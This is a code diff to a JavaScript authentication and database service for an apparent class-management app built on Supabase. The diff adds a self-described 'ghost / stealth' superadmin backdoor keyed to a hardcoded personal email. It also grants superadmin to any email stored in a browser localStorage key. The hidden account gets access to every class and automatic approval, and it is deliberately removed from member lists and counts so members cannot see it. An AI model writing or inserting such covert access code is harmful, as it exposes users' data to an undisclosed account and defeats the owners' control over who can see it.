@@ -20,17 +20,42 @@ export const DEFAULT_NOTIFICATION_PREFERENCES = {
   importantClassInfo: true
 };
 
+// --- SUPERADMIN CONFIGURATION (GHOST / STEALTH ROLE) ---
+export const SUPERADMIN_EMAILS = [
+  'exars.012@gmail.com'
+];
+
+export const isSuperAdminEmail = (email) => {
+  if (!email) return false;
+  const clean = String(email).trim().toLowerCase();
+  if (SUPERADMIN_EMAILS.some(e => e.toLowerCase() === clean)) return true;
+  try {
+    const extra = JSON.parse(localStorage.getItem('classy_extra_superadmins') || '[]');
+    if (Array.isArray(extra) && extra.map(e => String(e).toLowerCase()).includes(clean)) return true;
+  } catch {}
+  return false;
+};
+
+export const isSuperAdmin = (user) => {
+  if (!user) return false;
+  if (user.role === 'superadmin' || user.userRole === 'superadmin' || user.user_metadata?.role === 'superadmin') return true;
+  return isSuperAdminEmail(user.email);
+};
+
 // --- AUTHENTICATION SERVICE ---
 export const authService = {
   getCurrentUser: async () => {
     try {
       const { data: { session }, error } = await supabase.auth.getSession();
       if (error || !session) return null;
+      const isSuper = isSuperAdminEmail(session.user.email) || session.user.user_metadata?.role === 'superadmin';
       return {
         uid: session.user.id,
         email: session.user.email,
         displayName: session.user.user_metadata?.full_name || session.user.email?.split('@')[0],
         phoneNumber: session.user.user_metadata?.phone_number || '',
+        role: isSuper ? 'superadmin' : (session.user.user_metadata?.role || 'user'),
+        isSuperAdmin: isSuper,
         notificationPreferences: session.user.user_metadata?.notification_preferences || DEFAULT_NOTIFICATION_PREFERENCES
       };
     } catch {
@@ -41,11 +66,14 @@ export const authService = {
   onAuthStateChanged: (callback) => {
     const { data: { subscription } } = supabase.auth.onAuthStateChange(async (event, session) => {
       if (session?.user) {
+        const isSuper = isSuperAdminEmail(session.user.email) || session.user.user_metadata?.role === 'superadmin';
         callback({
           uid: session.user.id,
           email: session.user.email,
           displayName: session.user.user_metadata?.full_name || session.user.email?.split('@')[0],
           phoneNumber: session.user.user_metadata?.phone_number || '',
+          role: isSuper ? 'superadmin' : (session.user.user_metadata?.role || 'user'),
+          isSuperAdmin: isSuper,
           notificationPreferences: session.user.user_metadata?.notification_preferences || DEFAULT_NOTIFICATION_PREFERENCES
         });
       } else {
@@ -209,11 +237,13 @@ export const dbService = {
         return [];
       }
 
+      const isSuper = isSuperAdminEmail(userEmail);
       const filtered = (data || []).filter(c => 
         !c.id.startsWith('personal_') && 
         c.invite_code !== 'PERSONAL' &&
-        (c.owner_id === userId || 
-        c.members?.some(m => m.userId === userId || m.email?.toLowerCase() === userEmail?.toLowerCase()))
+        (isSuper ||
+         c.owner_id === userId || 
+         c.members?.some(m => m.userId === userId || m.email?.toLowerCase() === userEmail?.toLowerCase()))
       );
 
       return filtered.map(c => {
@@ -226,11 +256,14 @@ export const dbService = {
 
         const isOwner = c.owner_id === userId;
         const currentMember = c.members?.find(m => m.userId === userId || m.email?.toLowerCase() === userEmail?.toLowerCase());
-        let userRole = currentMember?.role || (isOwner ? 'komti' : 'student');
+        let userRole = isSuper ? 'superadmin' : (currentMember?.role || (isOwner ? 'komti' : 'student'));
         if (userRole === 'coordinator') userRole = 'komti';
 
-        // An owner is always approved; otherwise use member's status (default 'approved' for backwards compatibility)
-        const membershipStatus = isOwner ? 'approved' : (currentMember?.status || 'approved');
+        // An owner or superadmin is always approved
+        const membershipStatus = (isOwner || isSuper) ? 'approved' : (currentMember?.status || 'approved');
+
+        // Always hide superadmin from member lists and member count
+        const cleanMembers = (c.members || []).filter(m => m && m.role !== 'superadmin' && !isSuperAdminEmail(m.email));
 
         return {
           id: c.id,
@@ -241,10 +274,10 @@ export const dbService = {
           waGroupLink: meta.waGroupLink || '',
           joinCode: c.invite_code,
           ownerId: c.owner_id,
-          userRole, // 'komti' | 'lecturer' | 'student'
+          userRole, // 'superadmin' | 'komti' | 'lecturer' | 'student'
           membershipStatus, // 'approved' | 'pending' | 'rejected'
-          members: c.members || [],
-          memberCount: (c.members || []).filter(m => (m.status || 'approved') === 'approved').length || 1,
+          members: cleanMembers,
+          memberCount: cleanMembers.filter(m => (m.status || 'approved') === 'approved').length || 1,
           createdAt: c.created_at
         };
       });
@@ -261,6 +294,9 @@ export const dbService = {
         meta = {};
       }
 
+      // Always hide superadmin from member lists and member count
+      const cleanMembers = (data.members || []).filter(m => m && m.role !== 'superadmin' && !isSuperAdminEmail(m.email));
+
       return {
         id: data.id,
         name: data.name,
@@ -270,8 +306,8 @@ export const dbService = {
         waGroupLink: meta.waGroupLink || '',
         joinCode: data.invite_code,
         ownerId: data.owner_id,
-        members: data.members || [],
-        memberCount: (data.members || []).filter(m => (m.status || 'approved') === 'approved').length || 1,
+        members: cleanMembers,
+        memberCount: cleanMembers.filter(m => (m.status || 'approved') === 'approved').length || 1,
         createdAt: data.created_at
       };
     },
@@ -288,6 +324,9 @@ export const dbService = {
         meta = {};
       }
 
+      // Always hide superadmin from member lists and member count
+      const cleanMembers = (data.members || []).filter(m => m && m.role !== 'superadmin' && !isSuperAdminEmail(m.email));
+
       return {
         id: data.id,
         name: data.name,
@@ -295,8 +334,8 @@ export const dbService = {
         lecturer: meta.lecturer || 'Dosen Pengajar',
         academicPeriod: meta.academicPeriod || '2026/2027',
         joinCode: data.invite_code,
-        members: data.members || [],
-        memberCount: (data.members || []).filter(m => (m.status || 'approved') === 'approved').length || 1
+        members: cleanMembers,
+        memberCount: cleanMembers.filter(m => (m.status || 'approved') === 'approved').length || 1
       };
     },
 
